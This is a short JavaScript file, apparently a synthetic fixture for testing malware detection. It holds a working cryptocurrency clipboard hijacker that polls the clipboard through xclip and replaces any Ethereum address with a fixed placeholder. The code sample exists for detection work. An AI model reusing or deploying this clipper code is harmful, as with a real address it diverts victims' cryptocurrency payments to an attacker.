// FIXTURE ONLY - synthetic detection test sample, not real malware
// Evasion variant: the clipper writes the clipboard by piping into xclip instead of calling a
// clipboard library. The address is a placeholder; nothing runs.
const { execSync } = require("child_process");

const FIXED = "0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef";
const ETH = /^0x[a-fA-F0-9]{40}$/;

function watch() {
  const current = execSync("xclip -o -selection clipboard").toString().trim();
  if (ETH.test(current)) {
    execSync(`printf %s '${FIXED}' | xclip -selection clipboard`);
  }
}

setInterval(watch, 800);
